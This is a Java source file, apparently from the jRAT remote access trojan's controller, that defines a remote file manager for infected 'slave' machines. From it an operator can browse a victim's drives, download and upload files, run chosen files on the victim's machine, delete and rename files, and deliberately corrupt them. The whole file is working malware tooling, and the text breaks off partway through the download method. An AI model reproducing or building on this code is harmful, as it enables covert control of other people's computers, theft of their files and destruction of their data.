package io.jrat.client.ui.frames;

import io.jrat.client.Drive;
import io.jrat.client.FileData;
import io.jrat.client.Main;
import io.jrat.client.SendFile;
import io.jrat.client.Slave;
import io.jrat.client.io.FileSystem;
import io.jrat.client.listeners.DirListener;
import io.jrat.client.packets.outgoing.Packet15ListFiles;
import io.jrat.client.packets.outgoing.Packet16DeleteFile;
import io.jrat.client.packets.outgoing.Packet21GetFile;
import io.jrat.client.packets.outgoing.Packet38RunCommand;
import io.jrat.client.packets.outgoing.Packet43CreateDirectory;
import io.jrat.client.packets.outgoing.Packet47RenameFile;
import io.jrat.client.packets.outgoing.Packet64FileHash;
import io.jrat.client.packets.outgoing.Packet70CorruptFile;
import io.jrat.client.settings.FileBookmarks;
import io.jrat.client.ui.renderers.table.FileViewTableRenderer;
import io.jrat.client.utils.IconUtils;
import io.jrat.client.utils.Utils;
import io.jrat.common.OperatingSystem;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Desktop;
import java.awt.Dimension;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.swing.DefaultComboBoxModel;
import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JProgressBar;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.JToolBar;
import javax.swing.WindowConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;
import javax.swing.table.DefaultTableModel;


@SuppressWarnings("serial")
public class FrameRemoteFiles extends BaseFrame {

	private JPanel contentPane;

	public Slave slave;
	public static final Map<Slave, FrameRemoteFiles> instances = new HashMap<Slave, FrameRemoteFiles>();
	public JTextField txtDir;
	public JTable table;
	public FileViewTableRenderer renderer;
	public FileViewTableRenderer rendererme;
	public DefaultTableModel model;
	public DefaultTableModel modelme;
	public boolean waitingForMd5;
	public HashMap<String, Icon> icons = new HashMap<String, Icon>();

	private JPopupMenu popupMenuRemote;
	private JTable tableme;
	private JButton btnGome;
	private JButton btnBackme;
	private JButton btnRefreshme;
	private JButton btnUpload;
	private JTextField txtDirme;
	private DirListener dir;
	private JMenu mnBookmarks;
	private JMenuItem mnRoots;
	private JMenuItem mnTemp;
	private JMenuItem mnAppdata;
	private JMenuItem mnDesktop;
	private JMenuItem mntmRun;
	private JMenuItem mntmPreviewFiletext;
	private JMenuItem mntmDownloadFile;
	private JMenuItem mntmNewFolder;
	private JMenuItem mntmDelete;
	private JMenuItem mntmRename;
	private JMenuItem mntmRefresh;
	private JMenuItem mntmBack;
	private JMenuItem mntmGo;
	private JMenuItem mntmMdHash;
	private JMenuItem mntmCorrupt;
	private JButton btnNewFolder;
	private JButton btnNewFolderme;
	private JButton btnDelete;
	private JMenuItem mntmExploreImages;
	private JMenuItem mnAdd;
	private JMenuItem mnRemove;
	private JLabel label;
	private JProgressBar progressBar;
	private JMenuItem mntmSelectAllFolders;
	private JMenuItem mntmSelectAllFiles;
	private JComboBox<String> driveComboBox;
	private JMenu mnQuickJump;
	private JToolBar toolBarSouth;
	private JToolBar toolBarNorth;
	private JPopupMenu popupMenu;
	private JMenu menu;
	private JMenuItem menuItem_1;
	private JMenuItem menuItem_2;
	private JMenuItem menuItem_3;

	public FrameRemoteFiles(Slave slave) {
		super();
		this.dir = new DirListener(slave);
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteFiles.class.getResource("/icons/files.png")));
		this.slave = slave;
		instances.put(slave, this);
		final Slave sl = slave;
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		setTitle("File manager - " + slave.getIP() + " - " + slave.getComputerName());
		setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 760, 500);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		Object[][] data = {};
		Object[] columnNames = new Object[] { "File name", "File size", "Last modified", "Hidden" };
		model = new DefaultTableModel(data, columnNames) {
			@Override
			public boolean isCellEditable(int row, int column) {
				return false;
			}
		};

		modelme = new DefaultTableModel(data, columnNames) {
			@Override
			public boolean isCellEditable(int row, int column) {
				return false;
			}
		};

		JSplitPane splitPane = new JSplitPane();
		splitPane.setResizeWeight(0.5);
		splitPane.setDividerLocation(350);

		JToolBar toolBar = new JToolBar();
		toolBar.setFloatable(false);

		toolBarNorth = new JToolBar();
		toolBarNorth.setFloatable(false);

		btnBackme = new JButton("");
		toolBarNorth.add(btnBackme);
		btnBackme.setToolTipText("Back");
		btnBackme.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				String sep = File.separator;
				if (!txtDirme.getText().contains(sep)) {
					txtDirme.setText("");
					while (modelme.getRowCount() > 0) {
						modelme.removeRow(0);
					}
					File[] f = File.listRoots();
					for (File fi : f) {
						rendererme.icons.put(fi.getAbsolutePath(), IconUtils.getFileIcon(fi));
						modelme.addRow(new Object[] { fi.getAbsolutePath(), "" });
					}
				} else {
					txtDirme.setText(txtDirme.getText().substring(0, txtDirme.getText().lastIndexOf(sep)));
					while (modelme.getRowCount() > 0) {
						modelme.removeRow(0);
					}
					FileSystem.addDir(txtDirme.getText(), modelme, rendererme.icons);
				}
			}
		});
		btnBackme.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/left.png")));

		btnRefreshme = new JButton("");
		toolBarNorth.add(btnRefreshme);
		btnRefreshme.setToolTipText("Reload");
		btnRefreshme.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				while (modelme.getRowCount() > 0) {
					modelme.removeRow(0);
				}
				if (txtDirme.getText().length() == 0) {
					File[] f = File.listRoots();
					for (File fi : f) {
						rendererme.icons.put(fi.getAbsolutePath(), IconUtils.getFileIcon(fi));
						modelme.addRow(new Object[] { fi.getAbsolutePath(), "" });
					}
				} else {
					FileSystem.addDir(txtDirme.getText(), modelme, rendererme.icons);
				}
			}
		});
		btnRefreshme.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/refresh.png")));

		JButton btnDeleteme = new JButton("");
		btnDeleteme.setToolTipText("Delete");
		btnDeleteme.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String[] files = Utils.getFiles(tableme.getSelectedRows(), modelme);
				if (files != null) {
					for (String file : files) {
						if (Utils.yesNo("Confirm", "Confirm deleting " + file)) {
							new File(file).delete();
						}
					}
				}
			}
		});
		btnDeleteme.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/delete.png")));
		toolBarNorth.add(btnDeleteme);

		btnNewFolderme = new JButton("");
		btnNewFolderme.setToolTipText("New Folder");
		btnNewFolderme.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String foldername = JOptionPane.showInputDialog(null, "Input name of folder to create", "New Folder", JOptionPane.QUESTION_MESSAGE);
				if (foldername == null) {
					return;
				}
				foldername = foldername.trim();
				new File(txtDir.getText() + File.separator + foldername).mkdirs();
			}
		});
		btnNewFolderme.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/new_folder.png")));
		toolBarNorth.add(btnNewFolderme);

		btnGome = new JButton("");
		toolBarNorth.add(btnGome);
		btnGome.setToolTipText("Go");
		btnGome.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				String size = modelme.getValueAt(tableme.getSelectedRow(), 1).toString();
				String val = modelme.getValueAt(tableme.getSelectedRow(), 0).toString();
				if (size.length() == 0) {
					txtDirme.setText(val);
					while (modelme.getRowCount() > 0) {
						modelme.removeRow(0);
					}
					FileSystem.addDir(txtDirme.getText(), modelme, rendererme.icons);
				}
			}
		});
		btnGome.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/folder_go.png")));

		txtDirme = new JTextField();
		toolBarNorth.add(txtDirme);
		txtDirme.setEditable(false);
		txtDirme.setColumns(10);

		btnUpload = new JButton("");
		toolBarNorth.add(btnUpload);
		btnUpload.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				upload();
			}
		});
		btnUpload.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/right.png")));
		btnUpload.setToolTipText("Upload selected file");

		toolBarNorth.addSeparator(new Dimension(30, 20));

		JButton btnDownload = new JButton("");
		btnDownload.setToolTipText("Download selected");
		toolBarNorth.add(btnDownload);
		btnDownload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				download();
			}
		});
		btnDownload.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/left.png")));
		txtDir = new JTextField();
		txtDir.getDocument().addDocumentListener(new DocumentListener() {
			public void changedUpdate(DocumentEvent e) {
				txtChanged();
			}

			public void removeUpdate(DocumentEvent e) {
				txtChanged();
			}

			public void insertUpdate(DocumentEvent e) {
				txtChanged();
			}
		});

		driveComboBox = new JComboBox<String>();
		driveComboBox.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				sl.addToSendQueue(new Packet15ListFiles(driveComboBox.getSelectedItem().toString()));
			}
		});
		DefaultComboBoxModel<String> comboModel = (DefaultComboBoxModel<String>) driveComboBox.getModel();

		for (Drive drive : slave.getDrives()) {
			comboModel.addElement(drive.getName());
		}
		toolBarNorth.add(driveComboBox);

		JLabel label_1 = new JLabel("  ");
		toolBarNorth.add(label_1);
		toolBarNorth.add(txtDir);
		txtDir.setEditable(false);
		txtDir.setColumns(10);

		JButton btnBack = new JButton("");
		btnBack.setToolTipText("Back");
		toolBarNorth.add(btnBack);
		btnBack.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sep = sl.getFileSeparator();
				if (!txtDir.getText().contains(sep)) {
					txtDir.setText("");
					while (model.getRowCount() > 0) {
						model.removeRow(0);
					}
					sl.addToSendQueue(new Packet15ListFiles(""));
				} else {
					txtDir.setText(txtDir.getText().substring(0, txtDir.getText().lastIndexOf(sep)));
					while (model.getRowCount() > 0) {
						model.removeRow(0);
					}
					sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
				}
			}
		});
		btnBack.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/left.png")));

		JButton btnRefresh = new JButton("");
		toolBarNorth.add(btnRefresh);
		btnRefresh.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				while (model.getRowCount() > 0) {
					model.removeRow(0);
				}
				sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
			}
		});
		btnRefresh.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/refresh.png")));
		btnRefresh.setToolTipText("Reload");

		btnDelete = new JButton("");
		btnDelete.setToolTipText("Delete");
		btnDelete.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String[] files = Utils.getFiles(table.getSelectedRows(), model);
				if (files != null) {
					for (String file : files) {
						if (Utils.yesNo("Confirm", "Confirm deleting " + file)) {
							sl.addToSendQueue(new Packet16DeleteFile(file));
						}
					}
				}
			}
		});
		btnDelete.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/delete.png")));
		toolBarNorth.add(btnDelete);

		btnNewFolder = new JButton("");
		btnNewFolder.setToolTipText("New Folder");
		btnNewFolder.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String foldername = JOptionPane.showInputDialog(null, "Input name of folder to create", "New Folder", JOptionPane.QUESTION_MESSAGE);
				if (foldername == null) {
					return;
				}
				foldername = foldername.trim();
				sl.addToSendQueue(new Packet43CreateDirectory(txtDir.getText(), foldername));
			}
		});
		btnNewFolder.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/new_folder.png")));
		toolBarNorth.add(btnNewFolder);

		JButton btnGo = new JButton("");
		btnGo.setToolTipText("Go");
		toolBarNorth.add(btnGo);
		btnGo.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String size = model.getValueAt(table.getSelectedRow(), 1).toString();
				String val = model.getValueAt(table.getSelectedRow(), 0).toString();
				if (size.length() == 0) {
					txtDir.setText(val);
					while (model.getRowCount() > 0) {
						model.removeRow(0);
					}
					sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
				}
			}
		});
		btnGo.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/folder_go.png")));

		JScrollPane scrollPane = new JScrollPane();
		splitPane.setRightComponent(scrollPane);
		table = new JTable(model);
		table.setDefaultRenderer(Object.class, renderer = new FileViewTableRenderer(slave));
		table.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				if (e.getClickCount() == 2 && table.getSelectedRow() != -1) {
					String val = model.getValueAt(table.getSelectedRow(), 0).toString();
					String size = model.getValueAt(table.getSelectedRow(), 1).toString();
					if (size.length() == 0) {
						txtDir.setText(val);
						while (model.getRowCount() > 0) {
							model.removeRow(0);
						}
						sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
					}
				}
			}
		});
		table.setRowHeight(20);
		table.getColumnModel().getColumn(0).setPreferredWidth(250);
		table.getColumnModel().getColumn(1).setPreferredWidth(150);
		table.getColumnModel().getColumn(2).setPreferredWidth(180);
		table.getTableHeader().setReorderingAllowed(false);

		popupMenuRemote = new JPopupMenu();
		popupMenuRemote.addPopupMenuListener(new PopupMenuListener() {
			public void popupMenuCanceled(PopupMenuEvent arg0) {

			}

			public void popupMenuWillBecomeInvisible(PopupMenuEvent arg0) {

			}

			public void popupMenuWillBecomeVisible(PopupMenuEvent arg0) {
				File bm = new File(txtDir.getText());

				if (FileBookmarks.getGlobal().contains(bm)) {
					mnAdd.setEnabled(false);
					mnRemove.setEnabled(true);
				} else {
					mnAdd.setEnabled(true);
					mnRemove.setEnabled(false);
				}
			}
		});
		addPopup(scrollPane, popupMenuRemote);
		addPopup(table, popupMenuRemote);

		mntmRun = new JMenuItem("Run");
		mntmRun.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/runcmd.png")));
		mntmRun.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				String[] files = Utils.getFiles(table.getSelectedRows(), model);
				if (files != null) {
					for (String file : files) {
						sl.addToSendQueue(new Packet38RunCommand(file));
					}
				}
			}
		});

		mnQuickJump = new JMenu("Quick Jump");
		mnQuickJump.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/recent_folder.png")));
		popupMenuRemote.add(mnQuickJump);

		popupMenuRemote.addSeparator();

		mnRoots = new JMenuItem("Roots");
		mnQuickJump.add(mnRoots);

		mnAppdata = new JMenuItem("Appdata");
		mnQuickJump.add(mnAppdata);
		mnAppdata.addActionListener(dir);

		mnTemp = new JMenuItem("Temp");
		mnQuickJump.add(mnTemp);

		mnDesktop = new JMenuItem("Desktop");
		mnQuickJump.add(mnDesktop);
		mnDesktop.addActionListener(dir);
		mnTemp.addActionListener(dir);
		mnRoots.addActionListener(dir);
		popupMenuRemote.add(mntmRun);

		mntmPreviewFiletext = new JMenuItem("Preview file (Text, ZIP, Image)");
		mntmPreviewFiletext.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/preview.png")));
		mntmPreviewFiletext.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				String[] files = Utils.getFiles(table.getSelectedRows(), model);
				if (files != null) {
					for (String file : files) {
						if (file.toLowerCase().endsWith(".png") || file.toLowerCase().endsWith(".jpg") || file.toLowerCase().endsWith(".jpeg") || file.toLowerCase().endsWith(".gif")) {
							FramePreviewImage frame = new FramePreviewImage(sl, file);
							frame.setVisible(true);
						} else if (file.toLowerCase().endsWith(".zip") || file.toLowerCase().endsWith(".jar")) {
							FramePreviewZip frame = new FramePreviewZip(sl, file);
							frame.setVisible(true);
						} else {
							FramePreviewFile frame = new FramePreviewFile(sl, file);
							frame.setVisible(true);
						}
					}
				}
			}
		});
		popupMenuRemote.add(mntmPreviewFiletext);

		mntmDownloadFile = new JMenuItem("Download File(s)");
		mntmDownloadFile.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/left.png")));
		mntmDownloadFile.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				download();
			}
		});
		popupMenuRemote.add(mntmDownloadFile);

		mntmExploreImages = new JMenuItem("Explore(.png, .jpg, .gif)");
		mntmExploreImages.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/images-stack.png")));
		mntmExploreImages.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				List<String> files = new ArrayList<String>();
				for (int i = 0; i < model.getRowCount(); i++) {
					String str = model.getValueAt(i, 0).toString().toLowerCase().trim();
					if (str.endsWith(".png") || str.endsWith(".gif") || str.endsWith(".jpg") || str.endsWith(".jpeg")) {
						if (table.isRowSelected(i)) {
							files.add(str);
						}
					}
				}

				if (files.size() > 0) {
					String[] paths = new String[files.size()];
					for (int i = 0; i < files.size(); i++) {
						paths[i] = files.get(i);
					}
					FrameRemoteThumbView frame = new FrameRemoteThumbView(sl, paths);
					frame.setVisible(true);
				}
			}
		});
		popupMenuRemote.add(mntmExploreImages);

		popupMenuRemote.addSeparator();

		mntmNewFolder = new JMenuItem("New Folder");
		mntmNewFolder.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/new_folder.png")));
		mntmNewFolder.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				String foldername = JOptionPane.showInputDialog(null, "Input name of folder to create", "New Folder", JOptionPane.QUESTION_MESSAGE);
				if (foldername == null) {
					return;
				}
				foldername = foldername.trim();
				sl.addToSendQueue(new Packet43CreateDirectory(txtDir.getText(), foldername));
			}
		});
		popupMenuRemote.add(mntmNewFolder);

		mntmDelete = new JMenuItem("Delete");
		mntmDelete.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/delete.png")));
		mntmDelete.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				String[] files = Utils.getFiles(table.getSelectedRows(), model);
				if (files != null) {
					for (String file : files) {
						if (Utils.yesNo("Confirm", "Confirm deleting " + file)) {
							sl.addToSendQueue(new Packet16DeleteFile(file));
						}
					}
				}
			}
		});
		popupMenuRemote.add(mntmDelete);

		mntmRename = new JMenuItem("Rename");
		mntmRename.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/rename.png")));
		mntmRename.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				String file = model.getValueAt(table.getSelectedRow(), 0).toString();
				if (file != null) {
					String result = JOptionPane.showInputDialog(null, "Input file name to rename to", "Rename", JOptionPane.QUESTION_MESSAGE);
					if (result == null) {
						return;
					}
					sl.addToSendQueue(new Packet47RenameFile(file, result.trim()));
				}
			}
		});
		popupMenuRemote.add(mntmRename);

		mntmMdHash = new JMenuItem("File Hash");
		mntmMdHash.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/barcode.png")));
		mntmMdHash.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				String file = model.getValueAt(table.getSelectedRow(), 0).toString();
				if (file != null) {
					sl.addToSendQueue(new Packet64FileHash(file));
					waitingForMd5 = true;
				}
			}
		});
		popupMenuRemote.add(mntmMdHash);

		mntmCorrupt = new JMenuItem("Corrupt");
		mntmCorrupt.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String file = model.getValueAt(table.getSelectedRow(), 0).toString();
				if (file != null) {
					sl.addToSendQueue(new Packet70CorruptFile(file));
				}
			}
		});
		mntmCorrupt.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/broken_document.png")));
		popupMenuRemote.add(mntmCorrupt);

		popupMenuRemote.addSeparator();

		mnBookmarks = new JMenu("Bookmarks");
		mnBookmarks.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/bookmark_go.png")));
		popupMenuRemote.add(mnBookmarks);

		mnAdd = new JMenuItem("Add");
		mnAdd.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FileBookmarks.getGlobal().getBookmarks().add(new File(txtDir.getText()));
				txtChanged();
			}
		});
		mnAdd.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/bookmark_add.png")));
		popupMenuRemote.add(mnAdd);

		mnRemove = new JMenuItem("Remove");
		mnRemove.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				FileBookmarks.getGlobal().remove(new File(txtDir.getText()));
				txtChanged();
			}
		});
		mnRemove.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/bookmark_remove.png")));
		popupMenuRemote.add(mnRemove);

		popupMenuRemote.addSeparator();

		mntmSelectAllFolders = new JMenuItem("Select all folders");
		mntmSelectAllFolders.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				int row = 0;
				for (int i = 0; i < model.getRowCount(); i++) {
					String val = model.getValueAt(i, 0).toString();
					Main.debug(val);
					if (val.substring(val.lastIndexOf(sl.getFileSeparator()), val.length()).contains(".")) {
						row = i - 1;
						break;
					}
				}
				table.getSelectionModel().setSelectionInterval(0, row);
			}
		});
		mntmSelectAllFolders.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/folders-stack.png")));
		popupMenuRemote.add(mntmSelectAllFolders);

		mntmSelectAllFiles = new JMenuItem("Select all files");
		mntmSelectAllFiles.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				int row = 0;
				for (int i = 0; i < model.getRowCount(); i++) {
					String val = model.getValueAt(i, 0).toString();
					Main.debug(val);
					if (val.substring(val.lastIndexOf(sl.getFileSeparator()), val.length()).contains(".")) {
						row = i - 1;
						break;
					}
				}
				table.getSelectionModel().setSelectionInterval(row, model.getRowCount());
			}
		});
		mntmSelectAllFiles.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/documents-stack.png")));
		popupMenuRemote.add(mntmSelectAllFiles);

		popupMenuRemote.addSeparator();

		mntmGo = new JMenuItem("Go");
		mntmGo.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				String size = model.getValueAt(table.getSelectedRow(), 1).toString();
				String val = model.getValueAt(table.getSelectedRow(), 0).toString();
				if (size.length() == 0) {
					txtDir.setText(val);
					while (model.getRowCount() > 0) {
						model.removeRow(0);
					}
					sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
				}
			}
		});
		mntmGo.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/right.png")));
		popupMenuRemote.add(mntmGo);

		mntmBack = new JMenuItem("Back");
		mntmBack.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				if (!txtDir.getText().contains("\\")) {
					txtDir.setText("");
					while (model.getRowCount() > 0) {
						model.removeRow(0);
					}
					sl.addToSendQueue(new Packet15ListFiles(""));
				} else {
					txtDir.setText(txtDir.getText().substring(0, txtDir.getText().lastIndexOf("\\")));
					while (model.getRowCount() > 0) {
						model.removeRow(0);
					}
					sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
				}
			}
		});
		mntmBack.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/left.png")));
		popupMenuRemote.add(mntmBack);

		mntmRefresh = new JMenuItem("Refresh");
		mntmRefresh.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				while (model.getRowCount() > 0) {
					model.removeRow(0);
				}
				sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
			}
		});
		mntmRefresh.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/refresh.png")));
		popupMenuRemote.add(mntmRefresh);

		scrollPane.setViewportView(table);

		JScrollPane scrollPaneme = new JScrollPane();
		splitPane.setLeftComponent(scrollPaneme);
		tableme = new JTable(modelme);
		tableme.setDefaultRenderer(Object.class, rendererme = new FileViewTableRenderer(slave));
		tableme.getTableHeader().setReorderingAllowed(false);
		tableme.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				if (e.getClickCount() == 2) {
					String size = modelme.getValueAt(tableme.getSelectedRow(), 1).toString();
					String val = modelme.getValueAt(tableme.getSelectedRow(), 0).toString();
					if (size.length() == 0) {
						txtDirme.setText(val);
						while (modelme.getRowCount() > 0) {
							modelme.removeRow(0);
						}
						FileSystem.addDir(txtDirme.getText(), modelme, rendererme.icons);
					} else {
						try {
							Desktop.getDesktop().open(new File(val));
						} catch (Exception e1) {
							e1.printStackTrace();
						}
					}
				}
			}
		});
		
		popupMenu = new JPopupMenu();
		addPopup(scrollPaneme, popupMenu);
		addPopup(tableme, popupMenu);
		
		menu = new JMenu("Quick Jump");
		menu.setIcon(new ImageIcon(FrameRemoteFiles.class.getResource("/icons/recent_folder.png")));
		popupMenu.add(menu);
		
		menuItem_1 = new JMenuItem("Appdata");
		menuItem_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String ret;
				
				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
					ret = System.getenv("APPDATA");
				} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
					ret = System.getProperty("user.home") + "Library/Application Support/";
				} else {
					ret = System.getProperty("java.io.tmpdir");
				}
				
				txtDirme.setText(ret);
				while (modelme.getRowCount() > 0) {
					modelme.removeRow(0);
				}
				FileSystem.addDir(txtDirme.getText(), modelme, rendererme.icons);
			}
		});
		menu.add(menuItem_1);
		
		menuItem_2 = new JMenuItem("Temp");
		menuItem_2.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				txtDirme.setText(System.getProperty("java.io.tmpdir"));
				while (modelme.getRowCount() > 0) {
					modelme.removeRow(0);
				}
				FileSystem.addDir(txtDirme.getText(), modelme, rendererme.icons);
			}
		});
		menu.add(menuItem_2);
		
		menuItem_3 = new JMenuItem("Desktop");
		menuItem_3.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				txtDirme.setText(System.getProperty("user.home") + "/Desktop/");
				while (modelme.getRowCount() > 0) {
					modelme.removeRow(0);
				}
				FileSystem.addDir(txtDirme.getText(), modelme, rendererme.icons);
			}
		});
		menu.add(menuItem_3);
		scrollPaneme.setViewportView(tableme);
		tableme.setRowHeight(20);
		tableme.getColumnModel().getColumn(0).setPreferredWidth(250);
		tableme.getColumnModel().getColumn(1).setPreferredWidth(150);
		tableme.getColumnModel().getColumn(2).setPreferredWidth(180);
		contentPane.setLayout(new BorderLayout(0, 0));
		contentPane.add(toolBarNorth, BorderLayout.NORTH);
		
		toolBarSouth = new JToolBar();
		toolBarSouth.setFloatable(false);
		contentPane.add(toolBarSouth, BorderLayout.SOUTH);
				
						label = new JLabel("...");
						toolBarSouth.add(label);
						label.setVisible(false);
		
				progressBar = new JProgressBar();
				toolBarSouth.add(progressBar);
				progressBar.setVisible(false);
		contentPane.add(splitPane);

		File[] f = File.listRoots();
		for (File fi : f) {
			rendererme.icons.put(fi.getAbsolutePath(), IconUtils.getFileIcon(fi));
			modelme.addRow(new Object[] { fi.getAbsolutePath(), "" });
		}

		super.setMinimumSize(super.getSize());

		if (FileBookmarks.getGlobal().getBookmarks().size() > 0) {
			ActionListener listener = new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					JMenuItem item = (JMenuItem) arg0.getSource();
					txtDir.setText(item.getText());
					while (model.getRowCount() > 0) {
						model.removeRow(0);
					}
					sl.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
				}
			};

			ImageIcon icon = IconUtils.getIcon("bookmark");

			for (File file : FileBookmarks.getGlobal().getBookmarks()) {
				JMenuItem item = new JMenuItem();
				item.setText(file.getAbsolutePath());
				item.setIcon(icon);

				item.addActionListener(listener);
				mnBookmarks.add(item);
			}
		}
	}

	public void exit() {
		instances.remove(slave);
	}

	public void download() {
		int[] rows = table.getSelectedRows();
		if (rows.length > 1) {
			String file = model.getValueAt(rows[0], 0).toString();
			JFileChooser f = new JFileChooser();
			f.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
			f.showSaveDialog(null);

			if (f.getSelectedFile() != null) {
				FrameFileTransfer frame = new FrameFileTransfer();
				frame.setVisible(true);

				FileData data = new FileData(slave);
				data.setLocalFile(f.getSelectedFile());

				slave.addToSendQueue(new Packet21GetFile(file));
				for (int i = 1; i < rows.length; i++) {
					int row = rows[i];
					if (model.getValueAt(row, 1).toString().length() > 0) {
						data.getRemoteFiles().add(model.getValueAt(row, 0).toString());
						frame.load(model.getValueAt(row, 0).toString());
					}
				}
			}
		} else if (rows.length == 1) {
			int row = table.getSelectedRow();
			String file = model.getValueAt(row, 0).toString();
			JFileChooser f = new JFileChooser();
			f.setSelectedFile(new File(file.substring(file.lastIndexOf(slave.getFileSeparator()), file.length())));
			f.showSaveDialog(null);
			if (f.getSelectedFile() != null && f.getSelectedFile().getParentFile().exists()) {
				FrameFileTransfer frame = new FrameFileTransfer();
				frame.load(file);
				frame.setVisible(true);

				if (model.getValueAt(row, 1).toString().length() > 0) {
					FileData data = new FileData(slave);
					data.setLocalFile(f.getSelectedFile());
